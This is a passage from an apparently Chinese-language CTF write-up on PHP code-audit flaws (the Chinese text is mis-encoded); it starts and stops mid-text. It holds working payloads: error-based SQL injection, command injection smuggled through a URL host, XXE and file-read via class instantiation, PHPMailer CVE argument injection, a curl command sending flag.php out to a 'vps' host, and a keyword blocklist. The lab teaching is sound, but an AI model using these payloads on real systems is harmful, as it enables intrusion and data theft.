æ¼æ´ã€‚</p><p><strong style="color:orange;">in_array()</strong></p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210320210651995.png" alt="image-20210320210651995" style="zoom: 67%;"><p>æ¼æ´åˆ©ç”¨çš„ä¾‹é¢˜å¦‚ä¸‹</p><pre><code class="hljs php"><span class="hljs-comment">//index.php</span><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;config.php&#x27;</span>;<span class="hljs-variable">$conn</span> = <span class="hljs-keyword">new</span> mysqli(<span class="hljs-variable">$servername</span>, <span class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span>, <span class="hljs-variable">$dbname</span>);<span class="hljs-keyword">if</span> (<span class="hljs-variable">$conn</span>-&gt;connect_error) &#123;    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;è¿æ¥å¤±è´¥: &quot;</span>);&#125;<span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;SELECT COUNT(*) FROM users&quot;</span>;<span class="hljs-variable">$whitelist</span> = <span class="hljs-keyword">array</span>();<span class="hljs-variable">$result</span> = <span class="hljs-variable">$conn</span>-&gt;query(<span class="hljs-variable">$sql</span>);<span class="hljs-keyword">if</span>(<span class="hljs-variable">$result</span>-&gt;num_rows &gt; <span class="hljs-number">0</span>)&#123;    <span class="hljs-variable">$row</span> = <span class="hljs-variable">$result</span>-&gt;fetch_assoc();    <span class="hljs-variable">$whitelist</span> = range(<span class="hljs-number">1</span>, <span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;COUNT(*)&#x27;</span>]);&#125;<span class="hljs-variable">$id</span> = stop_hack(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>]);<span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;SELECT * FROM users WHERE id=<span class="hljs-subst">$id</span>&quot;</span>;<span class="hljs-keyword">if</span> (!in_array(<span class="hljs-variable">$id</span>, <span class="hljs-variable">$whitelist</span>)) &#123;    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;id <span class="hljs-subst">$id</span> is not in whitelist.&quot;</span>);&#125;<span class="hljs-variable">$result</span> = <span class="hljs-variable">$conn</span>-&gt;query(<span class="hljs-variable">$sql</span>);<span class="hljs-keyword">if</span>(<span class="hljs-variable">$result</span>-&gt;num_rows &gt; <span class="hljs-number">0</span>)&#123;    <span class="hljs-variable">$row</span> = <span class="hljs-variable">$result</span>-&gt;fetch_assoc();    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;center&gt;&lt;table border=&#x27;1&#x27;&gt;&quot;</span>;    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$row</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>) &#123;        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;tr&gt;&lt;td&gt;&lt;center&gt;<span class="hljs-subst">$key</span>&lt;/center&gt;&lt;/td&gt;&lt;br&gt;&quot;</span>;        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;td&gt;&lt;center&gt;<span class="hljs-subst">$value</span>&lt;/center&gt;&lt;/td&gt;&lt;/tr&gt;&lt;br&gt;&quot;</span>;    &#125;    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/table&gt;&lt;/center&gt;&quot;</span>;&#125;<span class="hljs-keyword">else</span>&#123;    <span class="hljs-keyword">die</span>(<span class="hljs-variable">$conn</span>-&gt;error);&#125;<span class="hljs-meta">?&gt;</span></code></pre><pre><code class="hljs php"><span class="hljs-comment">//config.php</span><span class="hljs-meta">&lt;?php</span>  <span class="hljs-variable">$servername</span> = <span class="hljs-string">&quot;localhost&quot;</span>;<span class="hljs-variable">$username</span> = <span class="hljs-string">&quot;fire&quot;</span>;<span class="hljs-variable">$password</span> = <span class="hljs-string">&quot;fire&quot;</span>;<span class="hljs-variable">$dbname</span> = <span class="hljs-string">&quot;day1&quot;</span>;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">stop_hack</span>(<span class="hljs-params"><span class="hljs-variable">$value</span></span>)</span>&#123;    <span class="hljs-variable">$pattern</span> = <span class="hljs-string">&quot;insert|delete|or|concat|concat_ws|group_concat|join|floor|\/\*|\*|\.\.\/|\.\/|union|into|load_file|outfile|dumpfile|sub|hex|file_put_contents|fwrite|curl|system|eval&quot;</span>;    <span class="hljs-variable">$back_list</span> = explode(<span class="hljs-string">&quot;|&quot;</span>,<span class="hljs-variable">$pattern</span>);    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$back_list</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$hack</span>)&#123;        <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/<span class="hljs-subst">$hack</span>/i&quot;</span>, <span class="hljs-variable">$value</span>))            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;<span class="hljs-subst">$hack</span> detected!&quot;</span>);    &#125;    <span class="hljs-keyword">return</span> <span class="hljs-variable">$value</span>;&#125;<span class="hljs-meta">?&gt;</span></code></pre><p>å¯ä»¥çœ‹åˆ°ç½‘é¡µçš„åŠŸèƒ½å¾ˆç®€å•ï¼Œå°±æ˜¯è¾“å…¥ç”¨æˆ·idï¼Œç„¶åæœåŠ¡å™¨è¿”å›ç”¨æˆ·çš„ä¿¡æ¯ï¼Œä½†æ˜¯å¯¹idå‚æ•°ä½¿ç”¨in_array()å‡½æ•°è¿›è¡Œäº†æ£€æŸ¥ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ä¸Šé¢æåˆ°çš„æ¼æ´ï¼Œåªè¦payloadçš„ç¬¬ä¸€ä¸ªå­—ç¬¦åœ¨range(1,count(*))çš„èŒƒå›´ä¹‹å†…å³å¯ç»•è¿‡ç¬¬æ£€æŸ¥ã€‚ç»•è¿‡æ•ˆæœå¦‚ä¸‹</p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210320214443192.png" alt="image-20210320214443192" style="zoom:67%;"><p>ä½†æ˜¯æœ‰ä¸€ä¸ªstop_hackå‡½æ•°ï¼Œå…¶è¿‡æ»¤äº†å¾ˆå¤šsqlæ³¨å…¥ä¸­å¸¸ç”¨çš„å…³é”®è¯ï¼Œå¯¼è‡´äº†å¾ˆå¤šæ–¹æ³•æ— æ³•ä½¿ç”¨ï¼Œå…¶ä¸­orè¢«è¿‡æ»¤å°±å¾ˆéº»çƒ¦ï¼Œinformation_schemaä¸­åŒ…å«orå•è¯ï¼Œæ‰€ä»¥å¸¸è§„çš„æ³¨å…¥æ–¹æ³•æ— æ³•ä½¿ç”¨ã€‚</p><p>è¿™é‡Œå¯ä»¥ä½¿ç”¨æŠ¥é”™æ³¨å…¥ï¼Œä½¿ç”¨ make_set()å‡½æ•°å®ç°æŠ¥é”™æ³¨å…¥ã€‚</p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210320215543202.png" alt="image-20210320215543202" style="zoom:67%;"><pre><code class="hljs reasonml">?id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,make<span class="hljs-constructor">_set(7,0x7e,(<span class="hljs-params">select</span> <span class="hljs-params">user</span>()</span>),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)</code></pre><p>è¡¨åï¼Œåˆ—åæ— æ³•ä½¿ç”¨information_shcemaï¼Œä½†æ˜¯å¦‚æœæ˜¯ä¸ºäº†è·å–flagçš„è¯ï¼Œå¯ä»¥çŒœæµ‹æ˜¯åœ¨flagè¡¨çš„flagåˆ—</p><p>æœ€åè·å–flagçš„payload</p><pre><code class="hljs reasonml">?id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,make<span class="hljs-constructor">_set(7,0x7e,(<span class="hljs-params">select</span> <span class="hljs-params">flag</span> <span class="hljs-params">from</span> <span class="hljs-params">flag</span>)</span>,<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)</code></pre><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210320220057808.png" alt="image-20210320220057808" style="zoom:50%;"><h2 id="2-filter-varå‡½æ•°ç¼ºé™·"><a href="#2-filter-varå‡½æ•°ç¼ºé™·" class="headerlink" title="2.filter_varå‡½æ•°ç¼ºé™·"></a>2.filter_varå‡½æ•°ç¼ºé™·</h2><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-variable">$url</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$url</span>) &amp;&amp; filter_var(<span class="hljs-variable">$url</span>, FILTER_VALIDATE_URL))&#123;    <span class="hljs-variable">$site_info</span> = parse_url(<span class="hljs-variable">$url</span>);    <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/sec-redclub.com$/&#x27;</span>,<span class="hljs-variable">$site_info</span>[<span class="hljs-string">&#x27;host&#x27;</span>]))&#123;        exec(<span class="hljs-string">&#x27;curl &quot;&#x27;</span>.<span class="hljs-variable">$site_info</span>[<span class="hljs-string">&#x27;host&#x27;</span>].<span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-variable">$result</span>);        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;center&gt;&lt;h1&gt;You have curl <span class="hljs-subst">&#123;$site_info[&#x27;host&#x27;]&#125;</span> successfully!&lt;/h1&gt;&lt;/center&gt;</span><span class="hljs-string">              &lt;center&gt;&lt;textarea rows=&#x27;20&#x27; cols=&#x27;90&#x27;&gt;&quot;</span>;        <span class="hljs-keyword">echo</span> implode(<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-variable">$result</span>);    &#125;    <span class="hljs-keyword">else</span>&#123;        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;&lt;center&gt;&lt;h1&gt;Error: Host not allowed&lt;/h1&gt;&lt;/center&gt;&quot;</span>);    &#125;&#125;<span class="hljs-keyword">else</span>&#123;    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;center&gt;&lt;h1&gt;Just curl sec-redclub.com!&lt;/h1&gt;&lt;/center&gt;&lt;br&gt;</span><span class="hljs-string">          &lt;center&gt;&lt;h3&gt;For example:?url=http://sec-redclub.com&lt;/h3&gt;&lt;/center&gt;&quot;</span>;&#125;<span class="hljs-meta">?&gt;</span></code></pre><p><strong style="color:orange;">filter_var</strong></p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210320222243276.png" alt="image-20210320222243276" style="zoom:50%;"><p><strong>ä»£ç å®¡è®¡</strong></p><p>è¾“å…¥çš„ç½‘å€é¦–å…ˆç»è¿‡ filter_var()åˆ¤æ–­æ˜¯å¦ç¬¦åˆ uri æ ¼å¼è¦æ±‚ï¼Œç„¶åç”¨ parse_url()</p><p>æå–å‡ºå…¶ä¸­çš„ host éƒ¨åˆ†ï¼Œæ‹¼æ¥åˆ° exec()å‡½æ•°é‡Œï¼Œè€Œ url æ˜¯å¯æ§çš„ï¼Œæ˜æ˜¾æ€è·¯æ˜¯è¦åˆ©ç”¨</p><p>exec()æ¥å‘½ä»¤æ‰§è¡Œã€‚</p><p>å¯ä»¥ä½¿ç”¨å¦‚ä¸‹ payload è¿›å…¥å‘½ä»¤æ‰§è¡Œï¼Œå¼•å·ç”¨æ¥é—­åˆ curl åé¢çš„å¼•å·ï¼Œåˆ†å·åˆ™ç”¨æ¥é—­</p><p>åˆå‘½ä»¤ï¼Œä»è€Œæ‰§è¡Œ ls å‘½ä»¤ï¼Œå¹¶ä¸”ç”±äº parse_url()çš„è§£æé—®é¢˜ï¼Œä¼šæŠŠç¬¬ä¸€ä¸ªåˆ†å·åé¢çš„</p><p>å†…å®¹å½“ä½œ host éƒ¨åˆ†ï¼Œåˆ™ç»•è¿‡äº†æ­£åˆ™åŒ¹é…æ£€æŸ¥ã€‚</p><pre><code class="hljs awk">?url=hello:<span class="hljs-regexp">//</span><span class="hljs-string">&quot;;ls;&quot;</span>sec-redclub.com</code></pre><p>æ­¤æ—¶çš„<code>$site_info[host]</code>çš„å€¼ä¸º<code>&quot;;dir;&quot;sec-redclub.com</code>ï¼Œé‚£ä¹ˆæ‹¼æ¥åçš„è¯­å¥ ä¸º</p><pre><code class="hljs powershell"><span class="hljs-built_in">curl</span> <span class="hljs-string">&quot;&quot;</span>;<span class="hljs-built_in">dir</span>;<span class="hljs-string">&quot;sec-redclub.com&quot;</span></code></pre><p>è¿™æ ·å½“execæ‰§è¡Œæ—¶å°±ä¼šæ‰§è¡Œåˆ°dirå‘½ä»¤ï¼Œæ‰€ä»¥å°±å¯ä»¥åˆ—å‡ºç›®å½•</p><p>è¯»å–flag</p><pre><code class="hljs awk">?url=hello:<span class="hljs-regexp">//</span><span class="hljs-string">&quot;;more$&#123;IFS&#125;;&quot;</span>sec-redclub.com</code></pre><h2 id="3-å®ä¾‹åŒ–ä»»æ„å¯¹è±¡æ¼æ´"><a href="#3-å®ä¾‹åŒ–ä»»æ„å¯¹è±¡æ¼æ´" class="headerlink" title="3.å®ä¾‹åŒ–ä»»æ„å¯¹è±¡æ¼æ´"></a>3.å®ä¾‹åŒ–ä»»æ„å¯¹è±¡æ¼æ´</h2><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">NotFound</span></span>&#123;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;404&#x27;</span>);    &#125;&#125;spl_autoload_register(    <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"><span class="hljs-variable">$class</span></span>)</span>&#123;        <span class="hljs-keyword">new</span> NotFound();    &#125;);<span class="hljs-variable">$classname</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>]) ? <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>] : <span class="hljs-literal">null</span>;<span class="hljs-variable">$param</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;param&#x27;</span>]) ? <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;param&#x27;</span>] : <span class="hljs-literal">null</span>;<span class="hljs-variable">$param2</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;param2&#x27;</span>]) ? <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;param2&#x27;</span>] : <span class="hljs-literal">null</span>;<span class="hljs-keyword">if</span>(class_exists(<span class="hljs-variable">$classname</span>))&#123;    <span class="hljs-variable">$newclass</span> = <span class="hljs-keyword">new</span> <span class="hljs-variable">$classname</span>(<span class="hljs-variable">$param</span>,<span class="hljs-variable">$param2</span>);    var_dump(<span class="hljs-variable">$newclass</span>);    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$newclass</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span>=&gt;<span class="hljs-variable">$value</span>)        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$key</span>.<span class="hljs-string">&#x27;=&gt;&#x27;</span>.<span class="hljs-variable">$value</span>.<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;&#125;</code></pre><p>è¿™é“é¢˜ç›®è€ƒå¯Ÿçš„æ˜¯å®ä¾‹åŒ–æ¼æ´ç»“åˆXXEæ¼æ´ã€‚æˆ‘ä»¬åœ¨ä¸Šå›¾ç¬¬18è¡Œå¤„å¯ä»¥çœ‹åˆ°ä½¿ç”¨äº† <strong>class_exists</strong> å‡½æ•°æ¥åˆ¤æ–­ç±»æ˜¯å¦å­˜åœ¨ï¼Œå¦‚æœä¸å­˜åœ¨çš„è¯ï¼Œå°±ä¼šè°ƒç”¨ç¨‹åºä¸­çš„ <strong>__autoload</strong> å‡½æ•°ï¼Œä½†æ˜¯è¿™é‡Œæ²¡æœ‰ <strong>__autoload</strong> å‡½æ•°ï¼Œè€Œæ˜¯ç”¨ <a href="http://php.net/manual/en/function.spl-autoload-register.php"><strong>spl_autoload_register</strong></a> æ³¨å†Œäº†ä¸€ä¸ªç±»ä¼¼ <strong>__autoload</strong> ä½œç”¨çš„å‡½æ•°ï¼Œå³è¿™é‡Œè¾“å‡º404ä¿¡æ¯ã€‚</p><p>æˆ‘ä»¬è¿™é‡Œç›´æ¥åˆ©ç”¨PHPçš„å†…ç½®ç±»ï¼Œå…ˆç”¨ <strong>GlobIterator</strong> ç±»æœç´¢ <strong>flagæ–‡ä»¶</strong> åå­—ï¼Œæ¥çœ‹ä¸€ä¸‹PHPæ‰‹å†Œå¯¹ <strong>GlobIterator</strong> ç±»çš„ æ„é€ å‡½æ•°çš„å®šä¹‰ï¼š</p><blockquote><p>public <strong>GlobIterator::__construct</strong> ( string <code>$pattern</code> [, int <code>$flags</code> = FilesystemIterator::KEY_AS_PATHNAME | FilesystemIterator::CURRENT_AS_FILEINFO ] )</p></blockquote><p>é¦–å…ˆæˆ‘ä»¬éœ€è¦çŸ¥é“ flag åœ¨å“ªä¸ªæ–‡ä»¶ä¸­ï¼Œåœ¨ PHP çš„å†…ç½®ç±»ä¸­å¯ä»¥ç”¨ GlobIterator ç±»æ¥éå†æ–‡ä»¶ç³»ç»Ÿï¼Œå…¶æ„é€ å‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºè¦æœç´¢çš„æ–‡ä»¶åï¼Œç¬¬äºŒä¸ªå‚æ•°ä¸ºé€‰æ‹©æ–‡ä»¶çš„å“ªä¸ª</p><p>åˆ—ç›®å½•çš„payload:</p><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><span class="hljs-regexp">/homework/</span>php<span class="hljs-regexp">/xxe/i</span>ndex.php?name=GlobIterator&amp;param=./*.php&amp;param2=<span class="hljs-number">0</span></code></pre><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210320230302156.png" alt="image-20210320230302156">è¯»å–flag</p><p><strong>æ–¹æ³•ä¸€ï¼š</strong></p><p>å®ä¾‹åŒ– SimpleXMLElementç±»æ¥è¿›è¡Œ XXE</p><pre><code class="hljs xml">?name=SimpleXMLElement&amp;param=<span class="hljs-meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">ANY</span> [<span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">xxe</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;php://filter/read=convert.base64-encode/resource=/f1ag.php&quot;</span>&gt;</span>]&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">x</span>&gt;</span>%26xxe;<span class="hljs-tag">&lt;/<span class="hljs-name">x</span>&gt;</span>&amp;param2=2</code></pre><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210320230727404.png" alt="image-20210320230727404"></p><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210320230746924.png" alt="image-20210320230746924"></p><p><strong>æ–¹æ³•äºŒ:</strong></p><p>ä½¿ç”¨ SplFileObject ç±»ç›´æ¥è¯»å–æ–‡ä»¶</p><p>payload</p><pre><code class="hljs sqf">?<span class="hljs-built_in">name</span>=SplFileObject&amp;<span class="hljs-built_in">param</span>=./<span class="hljs-built_in">flag</span>.php&amp;param2=r</code></pre><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210320231130526.png" alt="image-20210320231130526"></p><h2 id="4-escapeshellargä¸escapeshellcmdä½¿ç”¨ä¸å½“"><a href="#4-escapeshellargä¸escapeshellcmdä½¿ç”¨ä¸å½“" class="headerlink" title="4.escapeshellargä¸escapeshellcmdä½¿ç”¨ä¸å½“"></a>4.escapeshellargä¸escapeshellcmdä½¿ç”¨ä¸å½“</h2><p>ä¸»ä½“ä¸Šå°±æ˜¯ä¸€ä¸ªè¿‡æ»¤äº†åçš„mailå‡½æ•°æ‰§è¡Œã€‚<br>mailå‡½æ•°çš„å‚æ•°æ˜¯è¿™æ ·çš„</p><pre><code class="hljs php"><span class="hljs-keyword">bool</span> mail (<span class="hljs-keyword">string</span> <span class="hljs-variable">$to</span> ,<span class="hljs-keyword">string</span> <span class="hljs-variable">$subject</span> ,<span class="hljs-keyword">string</span> <span class="hljs-variable">$message</span> [,<span class="hljs-keyword">string</span> <span class="hljs-variable">$additional_headers</span> [,<span class="hljs-keyword">string</span> <span class="hljs-variable">$additional_parameters</span> ]])</code></pre><p>ç”±äºé»˜è®¤è°ƒç”¨çš„æ˜¯linuxçš„sendmailå‡½æ•°ï¼Œæ‰€ä»¥å¯ä»¥åœ¨<code>message</code>ä¸­å†™å…¥æ¶æ„ä»£ç ã€‚æ¥ç€ç”±additional_parameters æŒ‡å®šé¢å¤–å‚æ•°ï¼Œä»è€Œå†™å…¥åœ¨æŒ‡å®šç›®å½•å†™å…¥æ–‡ä»¶ã€‚</p><p>ä½†æ˜¯ï¼Œphpçš„mailå‡½æ•°ä¹Ÿåœ¨åº•å±‚é»˜è®¤æ‰§è¡Œäº†ä¸€å±‚<code>escapeshellcmd()</code>å‡½æ•°ï¼Œé‚£ä¹ˆæ˜¾ç„¶è½¬ä¹‰äº†æˆ‘ä»¬çš„æ¶æ„ä»£ç ã€‚<br>ä¸è¿‡ï¼Œæœ¬é¢˜ä»£ç è¿˜æœ‰ä¸€å¤„ç»å…¸çš„<code>escapeshellarg()</code>ã€‚å¦‚æœ<code>escapeshellarg()</code>+<code>escapeshellcmd()</code>æ­é…ä½¿ç”¨ï¼Œå°†å‡ºç°ç‰¹æ®Šå­—ç¬¦é€ƒé€¸çš„é—®é¢˜ã€‚<br>buuä¸Šä¹Ÿæœ‰ä¸€ä¸ªç±»ä¼¼çš„é¢˜ç›®.è¿™é‡Œåˆ™å€Ÿç”¨é¡¹ç›®é‡Œçš„ä¾‹å­ç®€å•ä»‹ç»ä¸‹</p><pre><code class="hljs routeros">127.0.0.1<span class="hljs-string">&#x27; -v -d a=1</span><span class="hljs-string">#escapeshellarg</span><span class="hljs-string">&#x27;</span>127.0.0.1<span class="hljs-string">&#x27;\&#x27;</span><span class="hljs-string">&#x27; -v -d a=1&#x27;</span><span class="hljs-comment">#escapeshellcmd</span><span class="hljs-string">&#x27;127.0.0.1&#x27;</span>\\<span class="hljs-string">&#x27;&#x27;</span> -v -d <span class="hljs-attribute">a</span>=1\&#x27;</code></pre><p>æ­¤æ—¶æœ€åä¸€æ­¥å¯ä»¥çœ‹å‡ºï¼Œ<code>\\</code>å°†è¢«è§£é‡Šä¸º<code>\</code>ä¸å†èµ·åˆ°è½¬ä¹‰çš„ä½œç”¨ï¼Œè€Œæ˜¯ä½œä¸ºæ¢è¡Œç¬¦ã€‚å› æ­¤payloadå˜ä¸ºå…ˆæ˜¯<code>127.0.0.1</code>ï¼Œå†<code>-v -d</code>-då¯¹åº”çš„æ•°æ®ä¸º<code>a=1&#39;</code>.</p><p>æ¯”å¦‚CVE-2016-10033 è·ŸCVE-2016-10045çš„ä¸¤ä¸ªpayload</p><pre><code class="hljs awk">a( -OQueueDirectory=<span class="hljs-regexp">/tmp -X/</span>var<span class="hljs-regexp">/www/</span>html/x.php )@a.coma<span class="hljs-string">&#x27;( -OQueueDirectory=/tmp -X/var/www/html/x.php )@a.com</span></code></pre><p>å‰è€…æ²¡æœ‰escapeshellcmdç›´æ¥æ‰“ã€‚åè€…escapeshellcmdååˆåŠ äº†ä¸€å±‚escapeshellargå¯¼è‡´å­—ç¬¦é€ƒé€¸ã€‚</p><p>æºç å¦‚ä¸‹ï¼Œå¯¹å…¶è¿›è¡Œäº†æ³¨é‡Š</p><pre><code class="hljs php+HTML">&lt;?phphighlight_file(&#39;index.php&#39;);function waf($a)&#123;    foreach($a as $key &#x3D;&gt; $value)&#123;        if(preg_match(&#39;&#x2F;flag&#x2F;i&#39;,$key))&#123;&#x2F;&#x2F;éå†æ‰€æœ‰é”®ï¼Œä¸èƒ½å‡ºç°flagå­—æ ·            exit(&#39;are you a hacker&#39;);        &#125;    &#125;&#125;foreach(array(&#39;_POST&#39;, &#39;_GET&#39;, &#39;_COOKIE&#39;) as $__R) &#123;&#x2F;&#x2F;éå†æ‰€æœ‰ä»¥postï¼Œgetï¼Œcookieæ–¹å¼æäº¤çš„æ•°æ®ï¼Œ    if($$__R) &#123; &#x2F;&#x2F;ä¾‹å¦‚$flag&#x3D;a,$$flag--&gt;$a,ä¸€ä¸ªæ–°å˜é‡        foreach($$__R as $__k &#x3D;&gt; $__v) &#123;             if(isset($$__k) &amp;&amp; $$__k &#x3D;&#x3D; $__v) unset($$__k); &#x2F;&#x2F;è‹¥ä¹‹å‰æœ‰è¿™ä¸ªå˜é‡å¹¶ä¸”é”®å’Œå€¼ç›¸ç­‰ï¼Œå°±åˆ é™¤è¿™ä¸ªå˜é‡        &#125;    &#125;&#125;if($_POST) &#123; waf($_POST);&#125;if($_GET) &#123; waf($_GET); &#125;if($_COOKIE) &#123; waf($_COOKIE);&#125;if($_POST) extract($_POST, EXTR_SKIP);&#x2F;&#x2F;å°†é”®åå˜æˆå˜é‡åï¼Œå¦‚æœä¼ å…¥flagï¼Œåº”è¯¥æ˜¯è®¾ç½®äº†_GET[&#39;flag&#39;]è¿™ä¸ªå˜é‡if($_GET) extract($_GET, EXTR_SKIP);if(isset($_GET[&#39;flag&#39;]))&#123;&#x2F;&#x2F;å¿…é¡»è®¾ç½®ä»¥getæ–¹å¼ä¼ å‚çš„flag..è¿™ä¸ªå¯ä»¥ç”¨    if($_GET[&#39;flag&#39;] &#x3D;&#x3D;&#x3D; $_GET[&#39;hongri&#39;])&#123;        exit(&#39;error&#39;);    &#125;    if(md5($_GET[&#39;flag&#39;] ) &#x3D;&#x3D; md5($_GET[&#39;hongri&#39;]))&#123;&#x2F;&#x2F;æ•°ç»„æˆ–ç¢°æ’echo &quot;success!&quot;;   $url &#x3D; $_GET[&#39;url&#39;];        $urlInfo &#x3D; parse_url($url);        if(!(&quot;http&quot; &#x3D;&#x3D;&#x3D; strtolower($urlInfo[&quot;scheme&quot;]) || &quot;https&quot;&#x3D;&#x3D;&#x3D;strtolower($urlInfo[&quot;scheme&quot;])))&#123;            die( &quot;scheme error!&quot;);        &#125;        $url &#x3D; escapeshellarg($url);        $url &#x3D; escapeshellcmd($url);&#x2F;&#x2F;ç‰¹æ®Šå­—ç¬¦é€ƒé€¸        system(&quot;curl &quot;.$url);    &#125;&#125;?&gt;</code></pre><p>å¾ˆæ˜æ˜¾çš„å˜é‡è¦†ç›–ï¼Œä¹‹åè¦ç»•è¿‡wafã€‚å†æ¥ä¸‹æ¥å°±æ˜¯escapeshellsmd/argçš„æ­é…è¿›è¡Œå‘½ä»¤æ‰§è¡Œäº†ã€‚<br>é¦–å…ˆè¦è§£å†³çš„æ˜¯ï¼Œæˆ‘ä»¬å¿…é¡»ç»•è¿‡preg_matchçš„é™åˆ¶æ‰èƒ½ä¼ å…¥flagå˜é‡ã€‚å› æ­¤è¦åˆ©ç”¨å¥½å®ƒå†™å¥½çš„è¿™ä¸ªåŠŸèƒ½ã€‚</p><p>é¦–å…ˆè¿™é‡Œåˆ©ç”¨äº†å¯å˜å˜é‡çš„ç‰¹æ€§ã€‚å‡è®¾æˆ‘ä»¬æäº¤</p><pre><code class="hljs sqf">?<span class="hljs-built_in">flag</span>=test post:<span class="hljs-variable">_GET</span>[<span class="hljs-built_in">flag</span>]=test</code></pre><p>å½“å¼€å§‹éå† <code>$_POST</code> è¶…å…¨å±€æ•°ç»„çš„æ—¶å€™ï¼Œ <code>$__k</code> ä»£è¡¨ _GET[flag] ï¼Œæ‰€ä»¥ <code>$$__k</code>å°±æ˜¯ <code>$_GET[flag]</code> ï¼Œå³ test å€¼ï¼Œæ­¤æ—¶ <code>$$__k == $__v</code> æˆç«‹ï¼Œå˜é‡ <code>$_GET[flag]</code> å°±è¢« unset äº†</p><p>è€Œæ¥ä¸‹æ¥ä¸‹é¢åˆæœ‰ä¸€ä¸ªå˜é‡è¦†ç›–<br><code>if($_POST) extract($_POST, EXTR_SKIP);</code><br>æ‰€ä»¥ç›´æ¥å¾—åˆ°<code>$_GET[flag]=test</code>ç»•è¿‡ç¬¬ä¸€å±‚</p><p>ç¬¬äºŒå±‚åªéœ€åˆ©ç”¨0eçš„MD5å¼±ç±»å‹æ¯”è¾ƒ<br>æœ€åæ˜¯curlçš„å‘½ä»¤æ‰§è¡Œ<br><code>http://baidu.com/&#39; -F file=@/var/www/html/flag.php -x vps:9999</code><br>ä¼¼ä¹å½“curlç‰ˆæœ¬å˜é«˜åï¼Œå°†ä¸å†èƒ½æ‰§è¡Œã€‚<br><code>curl &#39;127.0.0.1&#39;\&#39;&#39;</code></p><h2 id="5-preg-matchå‡½æ•°æ¼æ´"><a href="#5-preg-matchå‡½æ•°æ¼æ´" class="headerlink" title="5.preg_matchå‡½æ•°æ¼æ´"></a>5.preg_matchå‡½æ•°æ¼æ´</h2><pre><code class="hljs php"><span class="hljs-comment">// index.php</span><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;flag.php&#x27;</span>;<span class="hljs-keyword">if</span>  (<span 